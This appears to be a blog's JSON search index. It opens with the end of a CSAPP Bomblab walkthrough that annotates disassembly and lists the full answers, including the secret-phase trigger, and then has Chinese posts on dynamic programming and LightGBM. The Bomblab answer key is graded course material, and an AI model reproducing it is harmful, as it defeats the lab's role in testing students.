0x004015e6 \u003c+34\u003e: lea 0xc(%rsp),%rcx 0x004015eb \u003c+39\u003e: lea 0x8(%rsp),%rdx 0x004015f0 \u003c+44\u003e: mov $0x402619,%esi 0x004015f5 \u003c+49\u003e: mov $0x603870,%edi // sscanf get the format in %esi, and get the value in %edi // here `x/s 0x402619` we get \"%d %d %s\" and `x/s 0x603870` we get `7 0` // and according to conclusion we get above // the %rax stores the number of elements we input // So, here we know in phase_4, we should not only input 7 0, but also another %s 0x004015fa \u003c+54\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e 0x004015ff \u003c+59\u003e: cmp $0x3,%eax 0x00401602 \u003c+62\u003e: jne 0x401635 \u003cphase_defused+113\u003e 0x00401604 \u003c+64\u003e: mov $0x402622,%esi 0x00401609 \u003c+69\u003e: lea 0x10(%rsp),%rdi // `x/s 0x402622` we get \"DrEvil\" 0x10(%rsp) is now 0x7fffffffe1a0 // `x/s 0x7fffffffe1a0` we know this is the additional string we input // for example, you input 7 0 asd in phase_4, and \"asd\" is saved in 0x10(%rsp) // so now we know the answer: 7 0 DrEvil 0x0040160e \u003c+74\u003e: callq 0x401338 \u003cstrings_not_equal\u003e 0x00401613 \u003c+79\u003e: test %eax,%eax 0x00401615 \u003c+81\u003e: jne 0x401635 \u003cphase_defused+113\u003e 0x00401617 \u003c+83\u003e: mov $0x4024f8,%edi // `x/s 0x4024f8`: \"Curses, you've found the secret phase!\" // function `puts` prints the string 0x0040161c \u003c+88\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x00401621 \u003c+93\u003e: mov $0x402520,%edi // `x/s 0x402520`: \"But finding it and solving it are quite different...\" 0x00401626 \u003c+98\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x0040162b \u003c+103\u003e: mov $0x0,%eax // Congratulations! you now enter the secret_phase! 0x00401630 \u003c+108\u003e: callq 0x401242 \u003csecret_phase\u003e 0x00401635 \u003c+113\u003e: mov $0x402558,%edi // `x/s 0x402558` we get \"Congratulations! You've defused the bomb!\" 0x0040163a \u003c+118\u003e: callq 0x400b10 \u003cputs@plt\u003e 0x0040163f \u003c+123\u003e: mov 0x68(%rsp),%rax 0x00401644 \u003c+128\u003e: xor %fs:0x28,%rax 0x0040164d \u003c+137\u003e: je 0x401654 \u003cphase_defused+144\u003e 0x0040164f \u003c+139\u003e: callq 0x400b30 \u003c__stack_chk_fail@plt\u003e 0x00401654 \u003c+144\u003e: add $0x78,%rsp 0x00401658 \u003c+148\u003e: retq Dump of assembler code for function secret_phase: 0x00401242 \u003c+0\u003e: push %rbx 0x00401243 \u003c+1\u003e: callq 0x40149e \u003cread_line\u003e // after calling this function, %rax saves the string we input 0x00401248 \u003c+6\u003e: mov $0xa,%edx 0x0040124d \u003c+11\u003e: mov $0x0,%esi 0x00401252 \u003c+16\u003e: mov %rax,%rdi 0x00401255 \u003c+19\u003e: callq 0x400bd0 \u003cstrtol@plt\u003e // here `strtol` converts str to long, the value saved in %rax // if the string we input is not a number, %rax will be 0, and explode then // Note: -1 is a very large number in unsigned 0x0040125a \u003c+24\u003e: mov %rax,%rbx 0x0040125d \u003c+27\u003e: lea -0x1(%rax),%eax // here we know the number we input should big than 1, small than 1001 0x00401260 \u003c+30\u003e: cmp $0x3e8,%eax 0x00401265 \u003c+35\u003e: jbe 0x40126c \u003csecret_phase+42\u003e 0x00401267 \u003c+37\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040126c \u003c+42\u003e: mov %ebx,%esi 0x0040126e \u003c+44\u003e: mov $0x6030f0,%edi // here %esi is the number we input, %edi is $0x6030f0 (list of node again) // x/120 0x6030f0 /* 0x6030f0 \u003cn1\u003e: 0x00000024 0x00000000 0x00603110 0x00000000 0x603100 \u003cn1+16\u003e: 0x00603130 0x00000000 0x00000000 0x00000000 0x603110 \u003cn21\u003e: 0x00000008 0x00000000 0x00603190 0x","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:10:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"The results for copy Border relations with Canada have never been better. 1 2 4 8 16 32 6 682 7 0 DrEvil ionefg 4 3 2 1 6 5 22 Confused about some of the content? Feel free to report an issue here. ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:11:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["algorithm"],"content":"Summary Understand dynamic programming based on two real examples ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:1:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… 动态规划其实某种意义上，就是高中数列题而已。 ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:2:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"能用动态规划解决的问题 问题的答案构成了数列 大规模问题依赖小规模问题答案递推得到，例如：$f(n) = f(n-1) + 2$ ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:3:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"应用动态规划 建立状态转移方程，例如：$f(n) = f(n-1) + 2$ 确定初始值和边界值（结束条件） 根据需要缓存结果。 按顺序从小往大计算 ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:4:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"例子——斐波那契数列 斐波那契数列：0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233…… 目的：求第n个值 解法1：递归（反例） def fib(n): if n\u003c2: return n else: return fib(n-1)+fib(n-2) # 天荒地老亦不得出也！时间复杂度：O（2的n次方）——随着递归深入，计算任务倍增！ print(fib(100)) 解法2：动态规划 def fib(n): results = list(range(n+1)) # 缓存 for i in range(n+1): if i\u003c2: results[i] = i # 初始值 else: results[i] = results[i-1] + results[i-2] # 状态转移方程，按顺序从小到大计算 return results[-1] # 秒算，时间复杂度：O（N），结果为354224848179261915075 print(fib(100)) ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:5:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"例子——不同路径选择 题目来源：leetcode 题目说明： 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ），机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。问总共有多少条不同的路径？ 样例： 输入：m = 3, n = 7(3行7列) 输出：28 思路 建立状态转移方程（i，j格子的值为左边格子的值+上边格子的值）：$f(i,j) = f(i-1,j)+f(i,j-1)$ 初始值与结束条件：初始值$f(0,0) = 0, f(m,n)结束$ 缓存并复用结果：需要用二维数组存储中间结果 按顺序从小到大计算：两个循环逐行逐列分析 代码： def count_paths(m,n): results = [[1 for _ in range(n)] for _ in range(m)] # 第0行第0列都是1，剪枝跳过 for i in range(1, m): # 行计算 for j in range(1, n): # 列计算 results[i][j] = results[i-1][j] + results[i][j-1] # 应用状态转移方程，且复用中间结果 return results[-1][-1] # 结果为28 print(count_paths(3,7)) ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:6:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"Reference @zhen tan Confused about some of the content? Feel free to report an issue here. ","date":"2022-03-11","objectID":"/posts/algorithm/dynamic-programming/:7:0","tags":null,"title":"Understand Dynamic Programming","uri":"/posts/algorithm/dynamic-programming/"},{"categories":["algorithm"],"content":"Summary Understanding Lightgbm: Gradient Boosting Decision Tree, including decision tree and gradient boosting. ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:1:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… GBDT包含两个重要的内容：Decision Tree（实际中采用CART回归树）和Gradient Boosting（梯度提升） ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:2:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"CART回归树 为什么不用CART分类树？因为GBDT每次迭代拟合的是梯度值，梯度值是连续值所以用回归树 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:3:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"Gradient Boosting 梯度提升树（Gradient Boosting Tree）是提升树（Boosting Tree）的一种改进，这里先介绍一下提升树 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:4:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"提升树 通俗理解：假如有个人30岁，我们首先用20岁去拟合，发现损失有10岁，这时我们用6岁去拟合剩下的损失，发现差距还有4岁，第三轮我们用3岁拟合剩下的差距，差距就只有一岁了。如果我们的迭代轮数还没有完，可以继续迭代。最后将每次拟合的岁数加起来便是模型输出的结果。 算法： 初始化$f_0(x) = 0$ 对$m = 1,2,…,M$ (a) 计算残差$r_{mi} = y_i - f_{m-1}(x)$ (b) 拟合残差$r_{mi}$ 学习CART回归树得到$h_m(x)$ (c) 更新$f_m(x) = f_{m-1} + h_m(x)$ 得到提升树$$f_M(x) = \\sum_{m=1}^M h_m(x)$$ 当损失函数L为平方损失/指数损失函数时，提升树每一步优化很简单。这里以平方损失函数为例： $$L(y, f_{t-1}(x)+h_t(x)) = (y-f_{t-1}(x)-h_t(x))^2 = (r-h_t(x))^2$$ 这里的$r = y - f_{t-1}(x)$即为我们的残差$h_t(x)$为本轮迭代得到的弱学习器 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:4:1","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"梯度提升树 但对于一般的损失函数而言，每一步优化起来没有那么容易。所以Friedman提出了梯度提升算法，利用最速下降的近似方式，关键是利用损失函数的负梯度作为提升树算法中的残差的近似值。 如果选择损失函数为平方损失，那么负梯度为 $$-[{∂L(y,f(x_i)) \\over ∂f(x_i)}]{{f(x) = f_{t-1}(x)}} = y-f(x_i)$$ 我们发现GBDT基于平方损失的回归问题其负梯度就是残差。（备注：如果是分类问题那么损失函数是logloss） ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:4:2","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"Lightgbm 基于传统GBDT，lightgbm做了以下优化与改进 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:5:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"1. 基于直方图的算法提升效率 决策树中最耗时的部分为寻找最佳分割点，通常寻找方法为预排序算法，将特征取值预排序并枚举可能分割点。但此方法不够高效 训练中连续特征分箱构建直方图，这样虽然精度略微降低，但寻找分割点的内存消耗和训练速度都更为高效。 复杂度： $$O(data * features) → O(bins * features)$$ 而我们知道bins是远小于data数量的，所以更加高效。 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:5:1","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"2. 带深度限制的leaf-wise叶子生长策略 大部分决策树算法采用逐层加深的方法生长树 lightgbm采用leaf-wise（最佳分裂节点优先）的生长策略 每次选择损失减小得最多的节点方向生长。 此举容易造成过拟合，因此我们有max_depth限制树的最大深度。 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:5:2","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"3. Goss算法 直观理解：不损害数据分布的前提下，丢弃小梯度的数据样本（小梯度表示训练误差较小，大多数情况下已经被良好训练），中心放在梯度大的难以学习的数据上。 算法：先将梯度绝对值由大到小排序，排序后选择a%的样本（大梯度样本，全部保留），剩下数据中抽取b%样本（小梯度）。之后再计算信息增益时通过常数$(1-a) \\over b$ 增大小梯度样本权重，如此可以尽量不改变数据分布（减少对模型准确性影响）。 ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:5:3","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"4. EFB算法 直观理解：对于高维稀疏数据中的互斥的特征（不同时取0），捆绑为一个特征，大大提高GBDT训练速度。 复杂度： $$O(bins * features) → O(bins * bundle)$$ ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:5:4","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"},{"categories":["algorithm"],"content":"Reference LightGBM GBDT算法原理以及实例理解 Confused about some of the content? Feel free to report an issue here. ","date":"2021-12-17","objectID":"/posts/algorithm/lightgbm/:6:0","tags":null,"title":"Understand Lightgbm","uri":"/posts/algorithm/lightgbm/"}]